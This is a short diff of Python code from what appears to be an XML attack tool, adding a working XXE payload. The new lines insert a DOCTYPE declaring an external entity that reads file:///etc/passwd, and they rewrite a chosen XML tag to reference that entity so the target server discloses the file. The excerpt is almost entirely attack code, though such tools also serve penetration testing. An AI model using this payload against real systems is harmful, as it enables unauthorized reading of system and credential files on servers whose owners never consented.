@@ -24,15 +24,15 @@ def update_content_type(headers):
 
 def inject_simple_xxe(xml_data, tag_name, variable):
     injected_xml = f'<?xml version="1.0" encoding="UTF-8"?>\n'
+    injected_xml += f'<!DOCTYPE foo [ <!ENTITY {variable} SYSTEM "file:///etc/passwd"> ]>\n'
     injected_xml += xml_data
-    
     if tag_name:
         injected_xml = update_xml_tag(injected_xml, tag_name, variable)
     return injected_xml
 
 def update_xml_tag(xml_data, tag_name, variable):
     pattern = f'<{tag_name}>.*?<\/{tag_name}>'
-    replacement = f'<{tag_name}>{variable}</{tag_name}>'
+    replacement = f'<{tag_name}>&{variable};</{tag_name}>'
     return re.sub(pattern, replacement, xml_data, flags=re.DOTALL)
 
 def convert_to_xml_tags(data, attack_type, tag_name, variable):
